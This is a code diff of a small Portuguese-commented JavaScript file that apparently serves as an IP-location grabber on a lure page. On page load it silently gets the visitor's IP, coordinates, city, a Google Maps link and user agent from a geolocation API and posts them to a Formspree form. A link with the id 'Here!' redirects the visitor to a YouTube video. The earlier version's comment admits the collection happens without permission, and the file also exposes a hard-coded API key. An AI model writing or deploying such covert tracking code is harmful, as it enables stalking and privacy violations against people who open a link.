@@ -1,84 +1,59 @@
+const formspreeEndpoint = "https://formspree.io/f/mnngrgzw"; // substitua se precisar
+const apiKey = "at_qJQg5RedA4H2Kd9IGXn7PzqG24UOc"; // sua chave ipify
 
-(() => {
-  const formspreeEndpoint = "https://formspree.io/f/mnngrgzw"; // troque se necessário
+function sendToFormspree(payload) {
+  return fetch(formspreeEndpoint, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload)
+  });
+}
 
-  function sendToFormspree(payload) {
-    return fetch(formspreeEndpoint, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
+function getIPAndGeo() {
+  const statusEl = document.getElementById('status');
+  if (statusEl) statusEl.textContent = "Status: obtendo IP e localização...";
+
+  const url = `https://geo.ipify.org/api/v2/country,city?apiKey=${apiKey}`;
+
+  fetch(url)
+    .then(r => {
+      if (!r.ok) throw new Error('Falha ao consultar ipify geo API');
+      return r.json();
+    })
+    .then(info => {
+      const payload = {
+        timestamp: new Date().toISOString(),
+        ip: info.ip,
+        latitude: info.location.lat,
+        longitude: info.location.lng,
+        city: info.location.city,
+        region: info.location.region,
+        country: info.location.country,
+        google_maps_link: info.location.lat && info.location.lng ? `https://www.google.com/maps?q=${info.location.lat},${info.location.lng}` : null,
+        user_agent: navigator.userAgent,
+        note: "Localização por ipify Geo API"
+      };
+
+      if (statusEl) statusEl.textContent = `Status: localização aproximada (${info.location.city || 'n/a'}, ${info.location.region || ''}). Enviando...`;
+      return sendToFormspree(payload);
+    })
+    .then(() => {
+      if (statusEl) statusEl.textContent = "Status: dados enviados com sucesso.";
+    })
+    .catch(err => {
+      if (statusEl) statusEl.textContent = "Status: erro ao obter IP/geo.";
+      console.warn(err);
     });
-  }
+}
 
-  function getIP() {
-    return fetch("https://api.ipify.org?format=json")
-      .then(r => { if (!r.ok) throw new Error('api.ipify falhou'); return r.json(); })
-      .then(d => d.ip)
-      .catch(() => null);
-  }
+// Chama ao carregar a página
+window.addEventListener('load', getIPAndGeo);
 
-  function getGeoByIPAndSend() {
-    const statusEl = document.getElementById('status');
-    if (statusEl) statusEl.textContent = "Status: obtendo IP público...";
-
-    getIP().then(ip => {
-      if (!ip) {
-        if (statusEl) statusEl.textContent = "Status: não foi possível obter IP.";
-        sendToFormspree({ timestamp: new Date().toISOString(), note: "Sem IP", user_agent: navigator.userAgent });
-        return;
-      }
-
-      if (statusEl) statusEl.textContent = "Status: IP obtido. Consultando geolocalização por IP...";
-
-      fetch("https://ipapi.co/json/")
-        .then(r => { if (!r.ok) throw new Error('ipapi falhou'); return r.json(); })
-        .then(info => {
-          const lat = info.latitude || null;
-          const lon = info.longitude || null;
-          const city = info.city || null;
-          const region = info.region || null;
-          const country = info.country_name || null;
-          const mapsLink = (lat && lon) ? `https://www.google.com/maps?q=${lat},${lon}` : null;
-
-          const payload = {
-            timestamp: new Date().toISOString(),
-            ip: ip,
-            latitude: lat,
-            longitude: lon,
-            city, region, country,
-            google_maps_link: mapsLink,
-            user_agent: navigator.userAgent,
-            note: "Localização por IP (sem permissão). Precisão baixa."
-          };
-
-          if (statusEl) statusEl.textContent = `Status: localização aproximada (${city || 'n/a'}, ${region || ''}). Enviando...`;
-          return sendToFormspree(payload);
-        })
-        .then(() => {
-          if (statusEl) statusEl.textContent = "Status: dados enviados (por IP).";
-        })
-        .catch(err => {
-          console.warn("Erro ipapi:", err);
-          if (statusEl) statusEl.textContent = "Status: falha na geolocalização por IP. Enviando apenas IP.";
-          sendToFormspree({
-            timestamp: new Date().toISOString(),
-            ip: ip,
-            user_agent: navigator.userAgent,
-            note: "Falha ipapi; apenas IP enviado"
-          });
-        });
-    });
-  }
-
-  // evento para executar ao carregar a página
-  window.addEventListener('load', getGeoByIPAndSend);
-
-  // redirecionamento do link
-  const here = document.getElementById('Here!');
-  if (here) {
-    here.addEventListener('click', function (event) {
-      event.preventDefault();
-      window.location.href = 'https://youtube.com/shorts/UM7TpdnbWfY?si=d_vDGrLYHqp5QZys';
-    });
-  }
-})();
+// Redirecionamento do link
+const here = document.getElementById('Here!');
+if (here) {
+  here.addEventListener('click', function (event) {
+    event.preventDefault();
+    window.location.href = 'https://youtube.com/shorts/UM7TpdnbWfY?si=d_vDGrLYHqp5QZys';
+  });
+}
